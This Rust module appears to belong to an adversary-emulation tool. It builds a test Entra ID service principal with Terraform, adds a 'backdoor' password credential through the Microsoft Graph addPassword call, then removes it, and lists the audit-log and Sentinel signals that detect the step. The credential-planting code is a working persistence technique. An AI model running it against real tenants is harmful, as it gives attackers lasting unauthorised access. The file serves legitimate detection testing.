use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const TERRAFORM: &str = r#"
terraform {
  required_providers {
    azuread = { source = "hashicorp/azuread", version = "~> 2.0" }
    random  = { source = "hashicorp/random",  version = "~> 3.0" }
  }
}

provider "azuread" {}

resource "random_string" "suffix" {
  length  = 8
  special = false
  upper   = false
}

resource "azuread_application" "app" {
  display_name = "stratus-red-team-sp-${random_string.suffix.result}"
}

resource "azuread_service_principal" "sp" {
  application_id = azuread_application.app.application_id
}

output "sp_object_id"  { value = azuread_service_principal.sp.object_id }
output "app_object_id" { value = azuread_application.app.object_id }
"#;

async fn graph_token() -> Result<String> {
    let tenant_id = std::env::var("AZURE_TENANT_ID")
        .map_err(|_| anyhow::anyhow!("AZURE_TENANT_ID env var not set"))?;
    let client_id = std::env::var("AZURE_CLIENT_ID")
        .map_err(|_| anyhow::anyhow!("AZURE_CLIENT_ID env var not set"))?;
    let client_secret = std::env::var("AZURE_CLIENT_SECRET")
        .map_err(|_| anyhow::anyhow!("AZURE_CLIENT_SECRET env var not set"))?;
    let url = format!(
        "https://login.microsoftonline.com/{}/oauth2/v2.0/token",
        tenant_id
    );
    let http = reqwest::Client::new();
    let params = [
        ("client_id", client_id.as_str()),
        ("client_secret", client_secret.as_str()),
        ("scope", "https://graph.microsoft.com/.default"),
        ("grant_type", "client_credentials"),
    ];
    let resp: serde_json::Value = http
        .post(&url)
        .form(&params)
        .send()
        .await?
        .json()
        .await?;
    resp["access_token"]
        .as_str()
        .ok_or_else(|| anyhow::anyhow!("No access_token in response"))
        .map(str::to_string)
}

async fn detonate_impl(
    outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let token = graph_token().await?;
    let http = reqwest::Client::new();

    let sp_id = outputs
        .get("sp_object_id")
        .ok_or_else(|| anyhow::anyhow!("Missing output: sp_object_id"))?;

    let url = format!(
        "https://graph.microsoft.com/v1.0/servicePrincipals/{}/addPassword",
        sp_id
    );

    let body = serde_json::json!({
        "passwordCredential": {
            "displayName": "stratus-red-team-sp-backdoor",
            "endDateTime": "2030-01-01T00:00:00Z"
        }
    });

    let resp = http
        .post(&url)
        .bearer_auth(&token)
        .json(&body)
        .send()
        .await?;

    if resp.status().is_success() || resp.status().as_u16() == 200 {
        let data: serde_json::Value = resp.json().await?;
        let key_id = data["keyId"].as_str().unwrap_or("unknown");
        println!(
            "Added backdoor credential (keyId: {}) to service principal '{}' — \
             attacker can authenticate using this credential",
            key_id, sp_id
        );
    } else {
        let status = resp.status();
        let text = resp.text().await.unwrap_or_default();
        anyhow::bail!(
            "Failed to add password to service principal ({}): {}",
            status,
            text
        );
    }

    Ok(())
}

fn detonate(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(
    outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let token = graph_token().await?;
    let http = reqwest::Client::new();

    let sp_id = outputs
        .get("sp_object_id")
        .ok_or_else(|| anyhow::anyhow!("Missing output: sp_object_id"))?;

    // Get SP to list credentials
    let get_url = format!("https://graph.microsoft.com/v1.0/servicePrincipals/{}", sp_id);
    let sp_data: serde_json::Value = http
        .get(&get_url)
        .bearer_auth(&token)
        .send()
        .await?
        .json()
        .await?;

    let creds = sp_data["passwordCredentials"]
        .as_array()
        .ok_or_else(|| anyhow::anyhow!("No passwordCredentials in response"))?;

    for cred in creds {
        let display_name = cred["displayName"].as_str().unwrap_or("");
        if display_name == "stratus-red-team-sp-backdoor" {
            let key_id = cred["keyId"].as_str().unwrap_or("");
            let remove_url = format!(
                "https://graph.microsoft.com/v1.0/servicePrincipals/{}/removePassword",
                sp_id
            );
            http.post(&remove_url)
                .bearer_auth(&token)
                .json(&serde_json::json!({ "keyId": key_id }))
                .send()
                .await?;
            println!("Removed backdoor credential (keyId: {}) from service principal '{}'", key_id, sp_id);
        }
    }

    Ok(())
}

fn revert(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "entra-id.persistence.backdoor-application-sp",
        friendly_name: "Backdoor Entra ID Service Principal with New Credential",
        description: "Adds a new password credential to an Entra ID service principal, allowing an attacker to authenticate as the service principal and access all resources assigned to it.",
        detection: "Entra ID audit log: Add service principal credentials. Microsoft Sentinel: Service principal credential added alert.",
        platform: Platform::EntraId,
        mitre_tactics: &[MitreTactic::Persistence],
        is_idempotent: false,
        is_slow: false,
        prerequisite_tf: Some(TERRAFORM),
        detonate,
        revert: Some(revert),
    }
}
